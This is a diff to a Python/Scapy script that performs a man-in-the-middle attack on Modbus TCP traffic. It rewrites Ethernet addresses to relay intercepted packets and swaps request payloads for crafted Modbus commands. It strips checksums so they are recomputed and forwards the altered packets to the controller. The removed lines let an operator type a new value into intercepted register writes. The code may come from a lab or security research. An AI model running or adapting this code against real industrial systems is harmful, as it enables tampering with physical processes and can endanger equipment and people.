@@ -196,81 +196,54 @@ def build_pdu(func_code: int):
 
 
 def handle_packet(pkt, port, log_file,mappings,own_mac,crafted_pkt):
-    custom_pkt=False
+    is_custom=False
     if crafted_pkt!="":
-        custom_pkt=True
+        is_custom=True
     src = own_mac
     dst = pkt[IP].dst 
 
     # print("Source: "+src)
     # print("Dest: "+str(mappings[dst]))
 
-    npkt=pkt #TODO: test if i really need to create a new var here, or if i can use pkt
-    npkt[Ether].src=src
-    npkt[Ether].dst=mappings[dst]
+    # npkt=pkt #TODO: test if i really need to create a new var here, or if i can use pkt
+    pkt[Ether].src=src
+    pkt[Ether].dst=mappings[dst]
 
 
-    if npkt.haslayer(ModbusADURequest):
-        if is_retransmission(npkt):
+    if pkt.haslayer(ModbusADURequest):
+        if is_retransmission(pkt):
             return
-        mb = npkt[ModbusADURequest]
-    # elif npkt.haslayer(ModbusADUResponse):
-    #     mb = npkt[ModbusADUResponse]
     else:
-        sendp(npkt,loop=0,inter=0.2,verbose=0)
+        sendp(pkt,loop=0,inter=0.2,verbose=0)
         return
 
-    tcp = npkt[TCP]
+    tcp = pkt[TCP]
    
     if tcp.sport != port and tcp.dport != port:
         return
     direction = "req " if tcp.dport == port else "resp"
-    src = f"{npkt[IP].src}:{tcp.sport}"
-    dst = f"{npkt[IP].dst}:{tcp.dport}"
+    src = f"{pkt[IP].src}:{tcp.sport}"
+    dst = f"{pkt[IP].dst}:{tcp.dport}"
     log_line(f"{direction} {src:>21} -> {dst:<21}", log_file)
 
-    
-    if npkt.haslayer(ModbusADURequest) and custom_pkt==False:
-        original_value = npkt[ModbusADURequest].registerValue
-        
-        
-        print("\nFunction:\t\t" + MODBUS_FUNCTION_CODES.get(npkt[ModbusADURequest].funcCode))
-        print("Register Address:\t",npkt[ModbusADURequest].registerAddr)
-        print("Original Value:\t\t",original_value)
-
-        new_value = input("Enter new value:")
-        # new_value=99
-        npkt[ModbusADURequest].registerValue=int(new_value)
-
-        print("New Value:\t\t",npkt[ModbusADURequest].registerValue)
-        # npkt[ModbusADURequest].transId=4660
-    # elif npkt.haslayer(ModbusADUResponse):
-    #     npkt[ModbusADUResponse].registerValue=1
-    #     print(f"Register Value: ",npkt[ModbusADUResponse].registerValue)
-    #     npkt[ModbusADUResponse].transId=4660
-
-    # del p.chksum
-    elif npkt.haslayer(ModbusADURequest) and custom_pkt==True:
+    if is_custom:
         print("Crafting custom packet")
-        trans_id = npkt[ModbusADURequest].transId
-        unit_id = npkt[ModbusADURequest].unitId
-        # print("Current Packet:")
-        # print(npkt.show(dump=True))
-        # print("-"*16)
+        trans_id = pkt[ModbusADURequest].transId
+        unit_id = pkt[ModbusADURequest].unitId
 
-        stripped = npkt.copy()
+        stripped = pkt.copy()
         stripped[TCP].remove_payload()
         modbus_payload = ModbusADURequest(transId=trans_id, unitId=unit_id) / crafted_pkt
 
-        npkt = stripped / modbus_payload
+        pkt = stripped / modbus_payload
+    else:
+        print("\nFunction:\t\t" + MODBUS_FUNCTION_CODES.get(pkt[ModbusADURequest].funcCode))
+    del pkt[TCP].chksum
+    del pkt[IP].chksum
 
-    del npkt[TCP].chksum
-    del npkt[IP].chksum
-
-    # print("Modified Packet:")
     # print(npkt.show(dump=True))
     # sendp(npkt,loop=0,inter=0.2,verbose=0) #try making this send and recieve to analysis the response
-    response = srp1(npkt, timeout=3, verbose=0)
+    response = srp1(pkt, timeout=3, verbose=0)
     if response:
         print("Response received:")
         response.show()
